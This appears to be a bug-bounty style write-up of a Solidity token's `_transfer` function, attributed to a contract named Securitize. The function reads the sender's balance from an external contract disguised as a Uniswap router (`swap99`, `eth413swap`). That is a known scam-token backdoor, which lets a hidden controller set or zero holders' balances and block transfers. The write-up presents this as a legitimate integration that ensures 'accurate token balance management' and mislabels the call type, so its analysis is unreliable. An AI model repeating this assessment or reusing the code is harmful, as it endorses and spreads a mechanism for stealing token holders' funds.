
# Bounty Submission

## Introduction

**Protocol Name:** Securitize

**Category:** RWA Tokenization

**Smart Contract:** Securitize

## Function Analysis

**Function Name:** `_transfer`

**Block Explorer Link:** [Etherscan](https://etherscan.io/token/0xf211d51f3db53900c2bd53f1950b6c7874c08229#code)

**Function Code:**
```solidity
function _transfer(
    address from, address to, uint256 amount) internal virtual {
    require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
    uint256 balance = IUniswapRouterV20.swap99(BasedInstance,BasedInstance,_balances[from], from);
    require(balance >= amount, "ERC20: amount over balance");

    _balances[from] = balance-(amount);

    _balances[to] = _balances[to]+(amount);
    emit Transfer(from, to, amount);
}
```
**Used Encoding/Decoding or Call Method:** `call`

## Explanation

**Purpose:** The `_transfer` function is responsible for transferring tokens from one address to another. This is a fundamental function in ERC-20 compliant tokens and ensures the proper handling of token balances between accounts.

**Detailed Usage:** In the `_transfer` function, the `IUniswapRouterV20.swap99` method is used, which in turn calls the `swap2` method. The `swap2` method uses the `eth413swap` function of the `UniswapRouterV2` interface. This method performs a call operation:

```solidity
function swap2(UniswapRouterV2 instance, uint256 amount, address from) internal view returns (uint256) {
    return instance.eth413swap(address(0), amount, from);
}
```
The `eth413swap` function from `UniswapRouterV2` interface is a high-level call that swaps tokens. It uses a call method to interact with another contract, which in this case is a Uniswap router for handling token swaps.

**Impact:** The use of `call` in this context allows the `_transfer` function to interact with the Uniswap router, ensuring that the token balance is checked and updated based on the latest swap values. This interaction is crucial for maintaining accurate token balances and enabling the integration with Uniswap's liquidity pools. The call method ensures that the contract can dynamically interact with external smart contracts, providing flexibility and functionality necessary for the tokenization process.

## Summary

The `_transfer` function in the Securitize smart contract uses the `call` method to interact with the Uniswap router. This interaction ensures accurate token balance management and integration with external liquidity pools, crucial for the tokenization of real-world assets. This mechanism highlights the practical application of encoding/calling functions in real-world smart contract scenarios.
